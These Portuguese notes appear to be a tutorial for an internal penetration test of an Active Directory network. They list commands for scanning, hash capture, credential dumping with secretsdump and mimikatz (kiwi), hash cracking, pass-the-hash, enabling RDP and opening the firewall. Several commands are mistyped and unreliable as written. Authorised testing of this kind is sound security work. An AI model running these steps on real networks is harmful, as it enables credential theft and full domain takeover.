## Pentest Interno: Do zero a Domain Admin

## Pentest em ambientes modernos

## Identificando o escopo na rede

`nmap --open -v -sS -p 445 -Pn 192.168.0.0/24 -oG smb.txt`

Obs: Sempre busque otimizar seu tempo, no exemplo acima focamos na porta 445 pois faz parte do nosso escopo e ao inves de varrer varias portas que não iria nos servir focamos em uma porta especifica.

`cat smb.txt | grep "Up" | cut -d " " -f 2 > targets`

`crackmapexec smb targets`

`nmap -v --open -Pn 192.168.0.1`

*Obs:
- Busque identificar dentre os ip encontdos qual possui AD.
- Para identificar se um servidor é AD basta analisar as portas abertas do alvo.
- E caso entrone o servidor tente fazer resoluções de nome
- por exemplo: host IP_POSSIVELALVO IP_DOSERVIDOR


## Capturando hashes na rede

*Obs: Para capturar hashes na rede é preciso ativar o responder em host que pertence a mesms a rede onde os alvos estão localizados e o a configuração do respondender deve estar definido em relação aos IPs somente aqueles que estiverem dentro do scopo e tambem para facilitar o processo de coleta de informações.*


## Validando as credenciais

- smbclient
- crackmapexec
- psexec.py
- metasploit (psexec)


## Enumerando as contas do AD

`rpcclient -W dominio_da_rede -U usuario x.x.x.x`

Enumerando usuarios

`enumdomusers`

Enumerando grupos

`enumdongroups`

Obtendo informações sobre um determinado usuario

`getusername`

Comando usado para buscar informações sobre usuario

`queryuser`

**Buscando por usuarios Administrativos:**

Listando todos os grupos

`enumdongroups`

`querygro`

Exemplo de listagem de usuarios que pertencem ao grupo de administradores.

`querygroupmem 0x200`

Exemplo de consulta sobre um determinado usuario apos listar que pertence ao grupo de administradores

`queryuser 0x1f4`




## Conseguindo Domain Admin

Terminal normal

`impacket-secresdump dominiodarede/usuario:'password'@x.x.x.x`

Utilzando metasploit

`meterpreter > load kiwi`

`meterpreter > creds_all`

*Obs: DCC e DCC2 indica que é uma hashe.*

DCC - Domain cache credentials

Quebrando a hashe encontrada:

`hashcat -m 2100 hash.txt /usr/share/wordlists/rockyou.txt --force`

Exibindo a senha resolvida

`hashcat -m 2100 hash.txt /usr/share/wordlists/rockyou.txt --show`

Utilizando john

`john --format=nt hash.txt --wordlist=/usr/share/wordlists/rockyou.txt`

Exibindo senha resolvida

`john --format=nt hash.txt --show`




## Obtendo acesso ao servidor

- crackmapexec
- psexec.py
- metasploit (psexec)


## Conclusão: Acesso completo

*Obs: utilzando a tecnica pass the hash*

`python3 /usr/share/doc/python3-impacket/examples/psexec.py usuario@x.x.x.x -hashes ......hashe_encontrada.......`

Habilitando RDP

`crackmapexec smb x.x.x.x -u usuario -p 'password' -M rdp -o ACTION=enable`

Caso tenha algum firewall bloqueando execute o comando abaixo para desbloquear

`C:\Windows\> advfirewall fireall add rule name="rdp" protocol=TCP dir=in localport=3389 action=allow`





















